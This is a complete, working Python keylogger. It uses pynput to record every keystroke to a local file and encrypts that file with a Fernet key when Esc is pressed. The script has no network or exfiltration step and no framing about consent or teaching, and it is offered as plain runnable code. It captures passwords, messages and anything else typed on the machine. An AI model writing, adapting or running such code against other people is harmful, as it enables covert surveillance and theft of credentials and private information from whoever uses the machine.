from pynput.keyboard import Key, Listener
from cryptography.fernet import Fernet

log = ""
key_log_file = "keylog.txt"
encrypted_log_file = "encrypted_keylog.txt"

# Function to write to keylog.txt
def write_file(data):
    with open(key_log_file, "a") as f:
        f.write(data)

# Function to encrypt the log file
def encrypt_log():
    key = load_key()
    cipher_suite = Fernet(key)
    with open(key_log_file, "rb") as file:
        file_data = file.read()
        encrypted_data = cipher_suite.encrypt(file_data)
    with open(encrypted_log_file, "wb") as file:
        file.write(encrypted_data)

# Function to load the encryption key
def load_key():
    return open("secret.key", "rb").read()

# Function to handle keystrokes
def on_press(key):
    global log
    try:
        log += str(key.char)
    except AttributeError:
        if key == Key.space:
            log += " "
        elif key == Key.enter:
            log += "\n"
        else:
            log += " " + str(key) + " "
    
    write_file(log)
    log = ""  # Reset log to capture new keystrokes

# Function to stop keylogger
def on_release(key):
    if key == Key.esc:
        encrypt_log()  # Encrypt log before exiting
        return False

# Start listening to keystrokes
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
